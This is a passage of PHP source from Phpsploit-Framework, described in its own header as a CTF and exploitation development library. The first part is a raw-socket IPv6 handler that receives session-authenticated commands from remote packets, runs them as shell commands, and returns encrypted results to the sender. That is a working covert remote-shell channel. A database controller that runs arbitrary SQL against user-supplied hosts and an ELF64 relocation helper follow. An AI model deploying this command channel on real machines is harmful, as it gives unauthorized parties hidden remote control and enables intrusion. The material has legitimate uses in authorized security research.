                    Class_Base_Response ::outputln ( "The session authorization ID issued by the packet receiver ( " . $_dst_ipv6 . " ) to the packet sender ( " . $_src_ipv6 . " ) was not detected in the local environment ( " . $_local_ipv6 . " ) . This packet has been filtered and ignored!" );
                    continue;
                }
                if ( $_dst_ipv6 != $_local_ipv6 ) {
                    if ( ! is_cli () ) {
                        Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( "receive from " . $_src_ipv6 . " to " . $_dst_ipv6 . " , package size ( " . $_receive_package[ "package_length" ] . " ) , data size ( " . $_receive_package[ "data_length" ] . " ) , data : " . $_receive_package[ "data" ] ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response ::outputln ( "\n" . ( "receive from " . $_src_ipv6 . " to " . $_dst_ipv6 . " , package size ( " . $_receive_package[ "package_length" ] . " ) , data size ( " . $_receive_package[ "data_length" ] . " ) , data : " . $_receive_package[ "data" ] ) . "\n" );
                    }
                    $_send_package = Class_Base_RawSocket ::create_ipv6_data_package ( $_src_ipv6 , $_dst_ipv6 , $_receive_package[ "data" ] );
                    Class_Base_RawSocket ::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $_dst_ipv6 );
                    if ( ! is_cli () ) {
                        Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( "send from " . $_local_ipv6 . " to " . $_dst_ipv6 . " , src_ipv6 (" . $_src_ipv6 . ") , package size : " . strlen ( $_send_package ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response ::outputln ( "\n" . ( "send from " . $_local_ipv6 . " to " . $_dst_ipv6 . " , src_ipv6 (" . $_src_ipv6 . ") , package size : " . strlen ( $_send_package ) ) . "\n" );
                    }
                    $_send_package    = null;
                    $_receive_package = null;
                } else {
                    $_data_length = strlen ( $_data );
                    if ( $_data_length < 32 ) {
                        $_send_package = Class_Base_RawSocket ::create_ipv6_data_package ( $_receive_package[ "head_source_address" ] , $_src_ipv6 , "authentication failed" );
                        Class_Base_RawSocket ::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $_src_ipv6 );
                        if ( ! is_cli () ) {
                            Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( $_src_ipv6 . " is authentication failed , time : " . date ( "Y-m-d H:i:s" , time () ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        } else {
                            Class_Base_Response ::outputln ( "\n" . ( $_src_ipv6 . " is authentication failed , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                        }
                    }
                    $_src_to_dst_session_id     = substr ( $_data , 0 , 32 );
                    $_local_authentication_code = self ::get_local_src_to_dst_session_id ( $_src_ipv6 );
                    if ( ! empty( $_local_authentication_code ) ) {
                        if ( $_src_to_dst_session_id == $_local_authentication_code ) {
                            if ( ( $_data_length >= ( 33 + 4 ) ) && ( substr ( $_data , 33 , 4 ) == "exit" ) ) {
                                throw new \Exception( "exit" , 0 );
                            }
                            if ( ( $_data_length > 33 ) ) {
                                $_command = substr ( $_data , 33 );
                                if ( self ::equals_command ( $_src_ipv6 , $_command ) ) {
                                    $_send_authentication_code = self ::get_authentication_code ( $_local_ipv6 , $_src_ipv6 );
                                    $_command_execute_result   = self ::read_source_ipv6_command_content ( $_src_ipv6 );
                                    $_send_data_filter_length  = strlen ( $_send_authentication_code . chr ( 32 ) . $_command . chr ( 10 ) );
                                    $_send_data                = ( $_send_authentication_code . chr ( 32 ) . $_command . chr ( 10 ) . $_command_execute_result );
                                    $_send_data_length         = strlen ( $_send_data );
                                    if ( $_send_data_length > ( $_send_data_filter_length + 400 ) ) {
                                        $_send_data = $_show_send_data = ( substr ( $_send_data , 0 , ( $_send_data_filter_length + 400 ) ) . ( chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) ) );
                                    } else {
                                        $_show_send_data = $_send_data;
                                    }
                                    $_send_data    = Class_Base_Security ::phpsploit_encode ( $_send_data , $_encode_key , base64_decode ( $_encode_iv_base64 ) );
                                    $_send_package = Class_Base_RawSocket ::create_ipv6_data_package ( $_local_ipv6 , $_src_ipv6 , $_send_data );
                                    if ( $_src_ipv6 != $_local_ipv6 ) {
                                        Class_Base_RawSocket ::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $_src_ipv6 );
                                    }
                                    if ( ! is_cli () ) {
                                        Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( ( ( $_src_ipv6 != $_local_ipv6 ) ? "send" : "show" ) . " form " . $_local_ipv6 . " to " . $_src_ipv6 . " , package size ( " . strlen ( $_send_package ) . " ) , data size ( " . strlen ( $_show_send_data ) . " ) , data : " . $_show_send_data ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    } else {
                                        Class_Base_Response ::outputln ( "\n" . ( ( ( $_src_ipv6 != $_local_ipv6 ) ? "send" : "show" ) . " form " . $_local_ipv6 . " to " . $_src_ipv6 . " , package size ( " . strlen ( $_send_package ) . " ) , data size ( " . strlen ( $_show_send_data ) . " ) , data : " . $_show_send_data ) . ( empty( $debug ) ? ( "" ) : ( " , encode_data : " . ( $_send_data ) . " , encode_data_size : " . strlen ( $_send_data ) ) ) . "\n" );
                                    }
                                } else {
                                    $_command_execute_result        = Class_Base_Shell ::command ( $_command );
                                    $_command_execute_result        = Class_Base_Format ::array_to_string ( $_command_execute_result );
                                    $_command_execute_result_length = strlen ( $_command_execute_result );
                                    $_write_length                  = self ::write_source_ipv6_command_content ( $_src_ipv6 , $_command , $_command_execute_result );
                                    if ( $_write_length === false ) {
                                        throw new \Exception( "Failed to write the command execution result to Shared memory!" , 0 );
                                    }
                                    $_send_authentication_code           = self ::get_authentication_code ( $_local_ipv6 , $_src_ipv6 );
                                    $_send_data_filter_length            = strlen ( $_send_authentication_code . chr ( 32 ) . $_command . chr ( 10 ) );
                                    $_command_execute_result_show_length = ( 984 - $_send_data_filter_length );
                                    if ( $_command_execute_result_length > $_command_execute_result_show_length ) {
                                        $_command_execute_result = ( substr ( $_command_execute_result , 0 , ( $_command_execute_result_show_length - 6 ) ) . ( chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) ) );
                                    }
                                    $_send_data        = ( $_send_authentication_code . chr ( 32 ) . $_command . chr ( 10 ) . $_command_execute_result );
                                    $_send_data_length = strlen ( $_send_data );
                                    if ( $_send_data_length > ( $_send_data_filter_length + 400 ) ) {
                                        $_send_data = $_show_send_data = ( substr ( $_send_data , 0 , ( $_send_data_filter_length + 400 ) ) . ( chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) ) );
                                    } else {
                                        $_show_send_data = $_send_data;
                                    }
                                    $_send_data    = Class_Base_Security ::phpsploit_encode ( $_send_data , $_encode_key , base64_decode ( $_encode_iv_base64 ) );
                                    $_send_package = Class_Base_RawSocket ::create_ipv6_data_package ( $_local_ipv6 , $_src_ipv6 , $_send_data );
                                    if ( $_src_ipv6 != $_local_ipv6 ) {
                                        Class_Base_RawSocket ::send_ipv6_data_package ( Class_Base_RawSocket::KEY_LOCAL_DOCKER , $_send_package , $_src_ipv6 );
                                    }
                                    if ( ! is_cli () ) {
                                        Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( ( ( $_src_ipv6 != $_local_ipv6 ) ? "send" : "show" ) . " form " . $_local_ipv6 . " to " . $_src_ipv6 . " , package size ( " . strlen ( $_send_package ) . " ) , data size ( " . strlen ( $_show_send_data ) . " ) , data : " . $_show_send_data ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    } else {
                                        Class_Base_Response ::outputln ( "\n" . ( ( ( $_src_ipv6 != $_local_ipv6 ) ? "send" : "show" ) . " form " . $_local_ipv6 . " to " . $_src_ipv6 . " , package size ( " . strlen ( $_send_package ) . " ) , data size ( " . strlen ( $_show_send_data ) . " ) , data : " . $_show_send_data ) . ( empty( $debug ) ? ( "" ) : ( " , encode_data : " . ( $_send_data ) . " , encode_data_size : " . strlen ( $_send_data ) ) ) . "\n" );
                                    }
                                }
                                $_command                            = null;
                                $_command_execute_result             = null;
                                $_command_execute_result_length      = null;
                                $_send_authentication_code           = null;
                                $_send_data_filter_length            = null;
                                $_command_execute_result_show_length = null;
                                $_send_data                          = null;
                                $_send_package                       = null;
                            }
                        }
                    }
                    $_data_length               = null;
                    $_src_to_dst_session_id     = null;
                    $_local_authentication_code = null;
                }
                $_receive_package       = null;
                $_src_ipv6              = null;
                $_dst_ipv6              = null;
                $_data                  = null;
                $_src_to_dst_session_id = null;
            }
            $_local_ipv6 = null;

        } catch ( \Exception $e ) {
            Class_Base_RawSocket ::clear_ipv6_socket ( Class_Base_RawSocket::KEY_LOCAL_DOCKER );
            if ( ! is_cli () ) {
                Class_Base_Response ::output_textarea_inner_html ( $result_show_id , ( "\n" . ( print_r ( $e , true ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response ::outputln ( "\n" . ( print_r ( $e , true ) ) . "\n" );
            }
        }
    }

    public static function get_source_shmid_key ( $src_ipv6 )
    {
        $_long6           = Class_Base_RawSocket ::ipv6_to_long6 ( $src_ipv6 );
        $_shmid_key_right = substr ( $_long6 , - 18 , 18 );
        $_shmid_key       = intval ( $_shmid_key_right );
        return $_shmid_key;
    }

    public static function get_shmid ( $shmid_key )
    {
        $_shmid = Class_Base_Memory ::open_share_memory ( $shmid_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::SIZE_SOURCE_IPV6_ADDRESS_SESSION_ID , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        return $_shmid;
    }

    public static function clear_shmid ( $shmid_key )
    {
        $_shmid = self ::get_shmid ( $shmid_key );
        if ( ! empty( $_shmid ) ) {
            return Class_Base_Memory ::clear_share_memory ( $_shmid );
        }
        return false;
    }

    public static function get_local_src_to_dst_session_id ( $src_ipv6 )
    {
        $_shmid_key = self ::get_source_shmid_key ( $src_ipv6 );
        $_shmid     = self ::get_shmid ( $_shmid_key );
        if ( empty( $_shmid ) ) {
            return null;
        }
        $_src_to_dst_session_id = Class_Base_Memory ::read_share_memory ( $_shmid , 0 , 32 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( empty( $_src_to_dst_session_id ) ) {
            return null;
        }
        $_src_to_dst_session_id = Class_Base_Format ::data_to_string ( $_src_to_dst_session_id );
        if ( empty( $_src_to_dst_session_id ) ) {
            return null;
        }
        return $_src_to_dst_session_id;
    }

    public static function create_src_to_dst_session_id_string ( $src_ipv6 , $dst_ipv6 )
    {
        if ( ( ! is_string ( $src_ipv6 ) ) || ( strlen ( $src_ipv6 ) <= 0 ) ) {
            throw new \Exception( "src_ipv6 is input error , src_ipv6 : " . print_r ( $src_ipv6 , true ) );
        }
        if ( ( ! is_string ( $dst_ipv6 ) ) || ( strlen ( $dst_ipv6 ) <= 0 ) ) {
            throw new \Exception( "dst_ipv6 is input error , dst_ipv6 : " . print_r ( $dst_ipv6 , true ) );
        }
        $_send_authentication_code = md5 ( ( Class_Base_RawSocket ::ipv6_to_long6 ( $src_ipv6 ) . ( self::SECURITY_CODE ) . Class_Base_RawSocket ::ipv6_to_long6 ( $dst_ipv6 ) ) );
        return $_send_authentication_code;
    }

    public static function get_command_share_memory_key ( $command )
    {
        $_command_share_memory_key             = md5 ( $command );
        $_command_share_memory_key_header      = substr ( $_command_share_memory_key , 0 , 5 );
        $_command_share_memory_key_footer      = substr ( $_command_share_memory_key , 28 , 4 );
        $_command_share_memory_key_string      = ( $_command_share_memory_key_header . $_command_share_memory_key_footer );
        $_command_share_memory_key_items       = str_split ( $_command_share_memory_key_string );
        $_command_share_memory_key_ascii_items = array ();
        foreach ( $_command_share_memory_key_items as $index => $command_share_memory_key_item ) {
            $_ascii_code_string        = strval ( ord ( $command_share_memory_key_item ) );
            $_ascii_code_string_length = strlen ( $_ascii_code_string );
            if ( $_ascii_code_string_length < 2 ) {
                $_ascii_code_string = ( '0' . $_ascii_code_string );
            } else if ( $_ascii_code_string_length > 2 ) {
                $_ascii_code_string = substr ( $_ascii_code_string , 1 , 2 );
            }
            $_command_share_memory_key_ascii_items[] = $_ascii_code_string;
        }
        $_command_share_memory_key_string  = implode ( "" , $_command_share_memory_key_ascii_items );
        $_command_share_memory_key_integer = intval ( $_command_share_memory_key_string );
        return $_command_share_memory_key_integer;
    }

    public static function equals_command ( $src_ipv6 , $command )
    {
        if ( ( is_string ( $command ) ) && ( strlen ( $command ) > 0 ) ) {
            $_src_ipv6_key = self ::get_source_ipv6_command_key ( $src_ipv6 );
            $_command_key  = self ::get_command_share_memory_key ( $command );
            $_shmid        = Class_Base_Memory ::open_share_memory ( $_src_ipv6_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1024 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
            if ( $_shmid === false ) {
                return false;
            }
            $_shmid_data        = Class_Base_Memory ::read_share_memory ( $_shmid , 0 , 18 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            $_shmid_command_key = Class_Base_Format ::data_to_string ( $_shmid_data );
            $_shmid_command_key = intval ( $_shmid_command_key );
            if ( $_command_key == $_shmid_command_key ) {
                return true;
            }
        }
        return false;
    }

    public static function get_source_ipv6_command_key ( $src_ipv6 )
    {
        $_source_ipv6_key         = self ::get_source_shmid_key ( $src_ipv6 );
        $_source_ipv6_key         = substr ( $_source_ipv6_key , 2 , 16 );
        $_source_ipv6_key_integer = intval ( $_source_ipv6_key );
        $_source_ipv6_key_integer = ( Interface_Base_BlockKey::COMMAND | $_source_ipv6_key_integer );
        return $_source_ipv6_key_integer;
    }

    public static function read_source_ipv6_command_content ( $src_ipv6 )
    {
        $_src_ipv6_key = self ::get_source_ipv6_command_key ( $src_ipv6 );
        $_shmid        = Class_Base_Memory ::open_share_memory ( $_src_ipv6_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1024 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
        if ( $_shmid === false ) {
            return false;
        }
        $_shmid_data = Class_Base_Memory ::read_share_memory ( $_shmid , ( 18 + 4 ) , ( 1024 - ( 18 + 4 ) ) , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( $_shmid_data === false ) {
            return false;
        }
        $_shmid_command_execute_result = Class_Base_Format ::data_to_string ( $_shmid_data );
        return $_shmid_command_execute_result;
    }

    public static function write_source_ipv6_command_content ( $src_ipv6 , $command , $command_execute_result )
    {
        $_separator                     = "\r\n\r\n";
        $_src_ipv6_key                  = self ::get_source_ipv6_command_key ( $src_ipv6 );
        $_command_key                   = self ::get_command_share_memory_key ( $command );
        $_command_execute_result_length = strlen ( $command_execute_result );
        if ( $_command_execute_result_length > 984 ) {
            $command_execute_result = ( substr ( $command_execute_result , 0 , ( 984 - 6 ) ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) );
        }
        $_content = ( $_command_key . $_separator . $command_execute_result );
        $_shmid   = Class_Base_Memory ::open_share_memory ( $_src_ipv6_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1024 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
        if ( $_shmid === false ) {
            return false;
        }
        $_write_length = Class_Base_Memory ::write_share_memory ( $_shmid , Class_Base_Format ::string_to_data ( "\0" , Class_Base_Memory::BLOCK_SIZE_1024 ) , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( $_write_length === false ) {
            return false;
        }
        $_write_length = Class_Base_Memory ::write_share_memory ( $_shmid , $_content , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        return $_write_length;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-4
 * Time: 下午10:21
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_Rela extends Class_Base
{
    const SIZE_R_OFFSET = ( Class_Base_Elf64::SIZE_ELF64_ADDR );
    const SIZE_R_INFO   = ( Class_Base_Elf64::SIZE_ELF64_XWORD );
    const SIZE_R_ADDEND = ( Class_Base_Elf64::SIZE_ELF64_SXWORD );


    const PURPOSE_R_OFFSET = "";
    const PURPOSE_R_INFO   = "";
    const PURPOSE_R_ADDEND = "";


    private static $_elf64_relas = array ();

    public $r_offset = null;
    public $r_info   = null;
    public $r_addend = null;


    public static function get_rela_size ()
    {
        $_rela_size = ( self::SIZE_R_OFFSET + self::SIZE_R_INFO + self::SIZE_R_ADDEND );
        return $_rela_size;
    }

    public static function get_r_offset_offset ()
    {
        $_offset = ( Class_Base_Elf::OFFSET_START );
        return $_offset;
    }

    public static function get_r_info_offset ()
    {
        $_offset = ( self::get_r_offset_offset () + self::SIZE_R_OFFSET );
        return $_offset;
    }

    public static function get_r_append_offset ()
    {
        $_offset = ( self::get_r_info_offset () + self::SIZE_R_INFO );
        return $_offset;
    }

    public static function create_elf64_rela ( $filepath , $r_offset , $r_info , $r_append )
    {
        self::$_elf64_relas[ $filepath ] = new Class_Base_Elf64_Rela( $r_offset , $r_info , $r_append );
    }

    public function __construct ( $r_offset , $r_info , $r_append )
    {
        $this->r_offset = $r_offset;
        $this->r_info   = $r_info;
        $this->r_addend = $r_append;

    }

    public function __destruct ()
    {
        $this->r_offset = null;
        $this->r_info   = null;
        $this->r_addend = null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-30
 * Time: 下午7:08
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Database extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_Database_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function query ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_drive_type = Class_Base_Request ::form ( "drive_type" , Class_Base_Request::TYPE_STRING , Class_Base_Database::TYPE_DRIVE_MYSQL );
        $_domain     = Class_Base_Request ::form ( "domain" , Class_Base_Request::TYPE_STRING , Class_Base_Database::DOMAIN_LOCALHOST );
        $_port       = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , Class_Base_Database::PORT_LOCALHOST );
        $_user       = Class_Base_Request ::form ( "user_name" , Class_Base_Request::TYPE_STRING , "" );
        $_password   = Class_Base_Request ::form ( "user_password" , Class_Base_Request::TYPE_STRING , "" );
        $_string     = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        $_type       = Class_Base_Request ::form ( "type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Security::TYPE_ENCODE_CRYPTO_JS );
        $_key        = ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] );
        $_iv         = ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ] );
        $_result     = "";
        if ( ( is_string ( $_user ) ) && ( strlen ( $_user ) > 0 ) && ( is_string ( $_password ) ) && ( is_string ( $_string ) ) && ( strlen ( $_string ) > 0 ) && ( is_integer ( $_type ) ) && ( Class_Base_Security ::is_phpsploit_encode_type ( $_type ) ) && ( is_string ( $_key ) ) && ( strlen ( $_key ) > 0 ) && ( is_string ( $_iv ) ) && ( strlen ( $_iv ) > 0 ) ) {
            if ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) {
                $_user     = Class_Base_Security ::phpsploit_decode_128 ( $_user , $_key , $_iv );
                $_password = Class_Base_Security ::phpsploit_decode_128 ( $_password , $_key , $_iv );
                $_string   = Class_Base_Security ::phpsploit_decode_128 ( $_string , $_key , $_iv );
                if ( ( is_string ( $_user ) ) && ( strlen ( $_user ) > 0 ) && ( is_string ( $_password ) ) && ( is_string ( $_string ) ) && ( strlen ( $_string ) > 0 ) ) {
                    Class_Base_Database ::connect ( $_drive_type , $_domain , $_port , $_user , $_password , array ( \PDO::ATTR_ERRMODE => PDO::ERRMODE_WARNING ) );
                    $_result = Class_Base_Database ::query_sqls_string ( $_string );
                    if ( $_result === false ) {
                        $_result = array ();
                        $_error  = Class_Base_Database ::get_error_infos ();
                    }
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] = "";
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ]  = "";
                }
            }
        }
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Database Query</div>';
            $_form_top    .= '<div style="margin-top:32px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This function module is mainly used for SQL statement queries, please use this function with caution! Incorrect SQL query statements may increase the performance burden of the database server and even pose data security risks! Before performing this operation, you should fully obtain legal authorization from the authorized party! Any unauthorized SQL query behavior is illegal, and you may bear the relevant legal consequences as a result! This module function can only be used for activities such as penetration testing, security auditing, and security technology research with legal authorization. </div>';
            $_form        = array (
                "action"    => "/database/query" ,
                "hiddens"   => array (
                    array (
                        "id"    => "encode_sql" ,
                        "name"  => "string" ,
                        "value" => "" ,
                    ) ,
                    array (
                        "id"    => "encode_user" ,
                        "name"  => "user_name" ,
                        "value" => "" ,
                    ) ,
                    array (
                        "id"    => "encode_password" ,
                        "name"  => "user_password" ,
                        "value" => "" ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "id"      => "algo_type" ,
                        "title"   => "( Encode Type )   : " ,
                        "name"    => "type" ,
                        "options" => array (
                            array ( "describe" => "ENCODE_CRYPTO_JS" , "title" => "ENCODE_CRYPTO_JS" , "value" => Class_Base_Security::TYPE_ENCODE_CRYPTO_JS , "selected" => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "algo_key" ,
                        "title"    => "( Encode Key ) : " ,
                        "describe" => "key" ,
                        "name"     => "key" ,
                        "value"    => "" ,
                    ) ,
                    array (
                        "id"       => "algo_iv" ,
                        "title"    => "( Encode IV ) : " ,
                        "describe" => "iv" ,
                        "name"     => "iv" ,
                        "value"    => "" ,
                    ) ,
                    array (
                        "id"       => "algo_domain" ,
                        "title"    => "( Database domain ) : " ,
                        "describe" => "domain" ,
                        "name"     => "domain" ,
                        "value"    => $_domain ,
                    ) ,
                    array (
                        "id"       => "algo_port" ,
                        "title"    => "( Database Port ) : " ,
                        "describe" => "port" ,
                        "name"     => "port" ,
                        "value"    => $_port ,
                    ) ,
                    array (
                        "id"       => "algo_user" ,
                        "title"    => "( Database User ) : " ,
                        "describe" => "user" ,
                        "name"     => "show_user" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_user ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( $_user , $_key , $_iv ) ) : ( $_user ) ) ,
                    ) ,
                    array (
                        "id"       => "algo_password" ,
                        "title"    => "( Database Password ) : " ,
                        "describe" => "password" ,
                        "name"     => "show_password" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_password ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( $_password , $_key , $_iv ) ) : ( $_password ) ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"    => "sql_statement" ,
                        "title" => "( SQL Statement   )   : " ,
                        "name"  => "show_string" ,
                        "value" => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_string ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( $_string , $_key , $_iv ) ) : ( $_string ) ) ,
                    ) ,
                    array (
                        "id"       => "result_data" ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_result ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( print_r ( $_result , true ) , $_key , $_iv ) ) : ( $_result ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "id"       => "error_data" ,
                        "title"    => "( Error Data )   : " ,
                        "name"     => "error" ,
                        "value"    => ( print_r ( $_error , true ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Database_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">
function init(){ 
    document.getElementById("algo_key").value=aes_key;
    document.getElementById("algo_iv").value=aes_iv; 
    if(document.getElementById("sql_statement").value!==""){
       document.getElementById("sql_statement").value=phpsploit_decode(document.getElementById("sql_statement").value,"' . $_key . '","' . $_iv . '"); 
    }
    if(document.getElementById("algo_user").value!==""){
       document.getElementById("algo_user").value=phpsploit_decode(document.getElementById("algo_user").value,"' . $_key . '","' . $_iv . '");
    }
    if(document.getElementById("algo_password").value!==""){
       document.getElementById("algo_password").value=phpsploit_decode(document.getElementById("algo_password").value,"' . $_key . '","' . $_iv . '");
    }
    if(document.getElementById("result_data").value!==""){
       document.getElementById("result_data").value=phpsploit_decode(document.getElementById("result_data").value,"' . $_key . '","' . $_iv . '");
    }
}
function to_submit(form_object){ 
    form_object.string.value=phpsploit_encode(document.getElementById("sql_statement").value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value);
    document.getElementById("sql_statement").value=""; 
    form_object.user_name.value=phpsploit_encode(document.getElementById("algo_user").value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value);
    document.getElementById("algo_user").value=""; 
    form_object.user_password.value=phpsploit_encode(document.getElementById("algo_password").value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value);
    document.getElementById("algo_password").value=""; 
    console.log(phpsploit_decode(form_object.string.value,form_object.user_name.value,form_object.user_password.value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value)); 
    document.getElementById("algo_key").value="";
    document.getElementById("algo_iv").value="";
    console.log("form is submit");
    return true;
}
</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function exec ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_drive_type = Class_Base_Request ::form ( "drive_type" , Class_Base_Request::TYPE_STRING , Class_Base_Database::TYPE_DRIVE_MYSQL );
